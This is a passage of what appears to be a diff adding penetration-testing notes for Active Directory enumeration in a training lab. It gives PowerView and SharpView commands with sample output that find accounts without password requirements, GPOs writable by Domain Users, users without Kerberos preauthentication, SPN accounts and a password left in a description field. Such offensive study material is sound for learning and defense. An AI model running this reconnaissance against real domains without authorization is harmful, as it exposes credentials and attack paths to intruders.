+guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
+nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
+```
+
+</Accordion>
+
+<Accordion title="Enumerating Domain User GPO Rights">
+
+### Enumerating Domain User GPO Rights
+
+**Miscellaneous Misconfigurations**
+
+```powershell
+PS C:\htb> $sid=Convert-NameToSid "Domain Users"
+PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+
+ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ObjectSID             :
+ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
+                        WriteOwner
+BinaryLength          : 36
+AceQualifier          : AccessAllowed
+IsCallback            : False
+OpaqueLength          : 0
+AccessMask            : 983095
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
+AceType               : AccessAllowed
+AceFlags              : ObjectInherit, ContainerInherit
+IsInherited           : False
+InheritanceFlags      : ContainerInherit, ObjectInherit
+PropagationFlags      : None
+AuditFlags            : None
+```
+
+</Accordion>
+
+<Accordion title="Enumerating GPO Names with PowerView">
+
+### Enumerating GPO Names with PowerView
+
+**Miscellaneous Misconfigurations**
+
+```powershell
+PS C:\htb> Get-DomainGPO |select displayname
+
+displayname
+-----------
+Default Domain Policy
+Default Domain Controllers Policy
+Deny Control Panel Access
+Disallow LM Hash
+Deny CMD Access
+Disable Forced Restarts
+Block Removable Media
+Disable Guest Account
+Service Accounts Password Policy
+Logon Banner
+Disconnect Idle RDP
+Disable NetBIOS
+AutoLogon
+GuardAutoLogon
+Certificate Services
+```
+
+</Accordion>
+
+<Accordion title="Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser">
+
+### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
+
+**Miscellaneous Misconfigurations**
+
+```powershell
+PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+samaccountname     : mmorgan
+userprincipalname  : mmorgan@inlanefreight.local
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+```
+
+</Accordion>
+
+<Accordion title="Finding Passwords in the Description Field using Get-Domain User">
+
+### Finding Passwords in the Description Field using Get-Domain User
+
+**Miscellaneous Misconfigurations**
+
+```powershell
+PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
+
+samaccountname description
+-------------- -----------
+administrator  Built-in account for administering the computer/domain
+guest          Built-in account for guest access to the computer/domain
+krbtgt         Key Distribution Center Service Account
+ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
+```
+
+</Accordion>
+
+<Accordion title="PowerView — Load and Enumerate">
+
+### PowerView — Load and Enumerate
+
+**PowerView — Load and Enumerate**
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-Command Get-DomainUser
+Get-DomainUser -Identity YOUR_USERNAME
+```
+
+**PowerView — Load and Enumerate**
+
+Context from the notebook: Replace  YOUR_USERNAME . Successful import makes the PowerView commands available in  this PowerShell session ; the final command returns the matching directory object. Loading PowerView is different from  Import-Module ActiveDirectory , which loads Microsoft's separate module.
+
+```text
+Import-Module ActiveDirectory
+```
+
+</Accordion>
+
+<Accordion title="Network Enumeration">
+
+### Network Enumeration
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+net share
+powershell Find-DomainShare -ComputerDomain domain.local
+```
+
+</Accordion>
+
+<Accordion title="Key Enumeration Methods">
+
+### Key Enumeration Methods
+
+**AD Password Policies and User Lists**
+
+Context from the notebook: With Credentials:  On a domain-joined machine, the built-in  net accounts /domain  command provides a clean, readable summary of the password policy. For more detailed, object-oriented output, PowerShell tools like PowerView ( Get-DomainPolicy ) are extremely effective.
+
+```text
+Get-DomainPolicy
+```
+
+</Accordion>
+
+<Accordion title="PowerView / SharpView">
+
+### PowerView / SharpView
+
+**Active Directory Enumeration from Windows**
+
+```text
+Get-DomainUser -Identity mmorgan
+```
+
+**Active Directory Enumeration from Windows**
+
+```text
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+```
+
+**Active Directory Enumeration from Windows**
+
+```text
+Get-DomainTrustMapping
+```
+
+**Active Directory Enumeration from Windows**
+
+```text
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+```
+
+**Active Directory Enumeration from Windows**
+
+```text
+Get-DomainUser -SPN
+```
+
+**Active Directory Enumeration from Windows**
+
+```text
+.\SharpView.exe Get-DomainUser -Identity forend
+```
+
+**Active Directory Enumeration from Windows**
+
+Context from the notebook: Purpose:  The SharpView equivalent of PowerView's  Get-DomainUser  command, executed as a standalone program.
+
+```text
+Get-DomainUser
+```
+
+</Accordion>
+
+<Accordion title="Common problems">
+
+### Common problems
+
+**PowerView — Load and Enumerate**
+
+Context from the notebook: Script not found Use  Get-Location  and  Test-Path .\PowerView.ps1 ; open the folder that actually contains the script.
+
+```text
+Get-Location
+```
+
+**PowerView — Load and Enumerate**
+
+Context from the notebook: Script not found Use  Get-Location  and  Test-Path .\PowerView.ps1 ; open the folder that actually contains the script.
+
+```text
+Test-Path .\PowerView.ps1
+```
+
+</Accordion>
+
+</AccordionGroup>
